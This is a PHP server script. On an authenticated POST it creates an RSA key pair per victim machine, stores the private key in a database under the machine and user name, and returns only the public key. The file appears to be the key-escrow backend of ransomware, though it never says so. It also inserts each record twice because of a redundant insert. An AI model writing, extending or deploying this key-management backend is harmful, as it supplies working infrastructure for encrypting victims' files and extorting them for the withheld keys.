<?php

include 'config.php';
if(!isset($_POST) || empty($_POST['pcname']) || @$_POST['servkey'] != $servkey) {
	exit;
}

set_include_path(get_include_path() . PATH_SEPARATOR . 'lib');


include 'lib/Crypt/RSA.php';


$rsa = new Crypt_RSA();
 
$rsa->setPrivateKeyFormat(CRYPT_RSA_PRIVATE_FORMAT_XML);
$rsa->setPublicKeyFormat(CRYPT_RSA_PUBLIC_FORMAT_XML);

extract($rsa->createKey(2048));

$pcname = $_POST['pcname']; 
$username = $_POST['username']; 

include 'db.php';
$stmt = $connection->prepare('INSERT INTO dummy (pcname, username, privatekey) VALUES (?, ?, ?)');

$stmt->execute([
	$pcname,
	$username,
	$privatekey
]);
include 'db.php';

$statement = $connection->prepare("select id from dummy where pcname = ?");
$statement->execute([$pcname]);
$id = $statement->fetch(PDO::FETCH_COLUMN);

if(!$id) {
        $stmt = $connection->prepare('INSERT INTO dummy (pcname, username, privatekey) VALUES (?, ?, ?)');

        $stmt->execute([
                $pcname,
                $username,
                $privatekey
        ]);
}
else {

        $stmt = $connection->prepare('UPDATE dummy SET username = ?, privatekey = ? WHERE id = ?');

        $stmt->execute([
                $username,
                $privatekey,
                $id
        ]);
}

//var_dump($privatekey);
echo $publickey;
